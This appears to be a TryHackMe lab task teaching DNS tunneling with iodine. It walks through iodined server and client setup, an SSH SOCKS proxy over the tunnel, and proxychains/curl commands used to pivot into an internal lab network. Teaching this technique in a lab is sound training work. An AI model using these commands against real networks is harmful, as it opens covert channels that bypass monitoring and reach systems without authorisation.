This task will show how to create a tunnel through the DNS protocol. Ensure that you understand the concept discussed in the previous task (Exifltration over DNS), as DNS Tunneling tools work based on the same technique.

DNS Tunneling (TCPoverDNS)  

This technique is also known as TCP over DNS, where an attacker encapsulates other protocols, such as HTTP requests, over the DNS protocol using the DNS Data Exfiltration technique. DNS Tunneling establishes a communication channel where data is sent and received continuously.

![DNS Tunneling - Data Flow](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8176731af9ec61cf248cdbc65df92172.png)  

This section will go through the steps required to establish a communication channel over the DNS. We will apply the technique to the network infrastructure we provided (**JumpBox** and **Victim2**) to pivot from Network 2 (192.168.0.0/24) to Network 1 (172.20.0.0/24) and access the internal web server. For more information about the network infrastructure, please check task 2.

We will be using the [iodine](https://github.com/yarrick/iodine) tool for creating our DNS tunneling communications. Note that we have already installed [iodine](https://github.com/yarrick/iodine) on the JumpBox and Attacker machines. To establish DNS tunneling, we need to follow the following steps:

1.  Ensure to update the DNS records and create new NS points to your AttackBox machine (Check Task 8), or you can use the preconfigured nameserver, which points to the Attacker machine (att.tunnel.com=172.20.0.200).
2.  Run **iodined** server from AttackBox or the Attacker machine. (note for the **server** side we use iodine**d**)
3.  On JumpBox, run the iodine client to establish the connection. (note for the client side we use iodine - without **d)**
4.  SSH to the machine on the created network interface to create a proxy over DNS. We will be using the -D argument to create a dynamic port forwarding.
5.  Once an SSH connection is established, we can use the local IP and the local port as a proxy in Firefox or ProxyChains.

Let's follow the steps to create a DNS tunnel. First, let's run the server-side application (iodined) as follows,

Running iodined Server  

```
thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com                                                                                                                                                                      Opened dns0 Setting IP of dns0 to 10.1.1.1 Setting MTU of dns0 to 1130 Opened IPv4 UDP socket Listening to dns for domain att.tunnel.com
```
	    

Let's explain the previous command a bit more:

-   Ensure to execute the command with sudo. The iodined creates a new network interface (dns0) for the tunneling over the DNS.
-   The -f argument is to run the server in the foreground.
-   The -c argument is to skip checking the client IP address and port for each DNS request.
-   The -P argument is to set a password for authentication.
-    The 10.1.1.1/24 argument is to set the network IP for the new network interface (dns0). The IP address of the server will be 10.1.1.1 and the client 10.1.1.2.
-   att.tunnel.com is the nameserver we previously set.

video_tryhackme


On the JumpBox machine, we need to connect to the server-side application. To do so, we need to execute the following:

Victim Connects to the Server  

video_tryhackme

   

Note that we executed the client-side tool (iodine) and provided the -f and -P arguments explained before. Once the connection is established, we open a new terminal and log in to 10.1.1.1 via SSH.




Note that all communication over the network 10.1.1.1/24 will be over the DNS. We will be using the -D argument for the dynamic port forwarding feature to use the SSH session as a proxy. Note that we used the -f argument to enforce ssh to go to the background. The -4 argument forces the ssh client to bind on IPv4 only. 

SSH over DNS  

           
```
root@attacker$ ssh thm@10.1.1.2 -4 -f -N -D 1080
```

Now that we have connected to JumpBox over the dns0 network, open a new terminal and use ProxyChains or Firefox with 127.0.0.1 and port 1080 as proxy settings. 

Use SSH Connection as a Proxy  

```
root@attacker$ proxychains curl http://192.168.0.100/demo.php root@attacker$ #OR root@attacker$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php
```
   

00:00

We can confirm that all traffic goes through the DNS protocol by checking the Tcpdump on the **Attacker** machine through the **eth0** interface.

![Capturing DNS traffic](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ffbd2ecb2563c649fde174b40c450097.png)  

Apply the DNS tunneling technique in the provided network environment and access http://192.168.0.100/test.php to answer the question below.
